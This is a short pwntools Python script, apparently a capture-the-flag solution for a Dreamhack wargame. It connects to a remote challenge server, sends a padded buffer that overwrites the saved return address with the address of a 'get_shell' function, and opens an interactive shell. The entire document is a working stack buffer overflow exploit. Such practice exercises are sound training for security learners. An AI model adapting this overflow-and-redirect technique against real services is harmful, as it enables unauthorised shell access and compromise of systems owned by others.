from pwn import *

p = remote('host3.dreamhack.games',1152) # 원격 서버 대상으로 익스플로잇 수행 
context.arch="amd64" # x86-64 

payload = 'A' * 0x30
payload += 'B' * 0x08
payload += '\xaa\x06\x40\x00\x00\x00\x00\x00' # get_shell address

p.recvuntil('Input: ')
p.sendline(payload)

p.interactive()
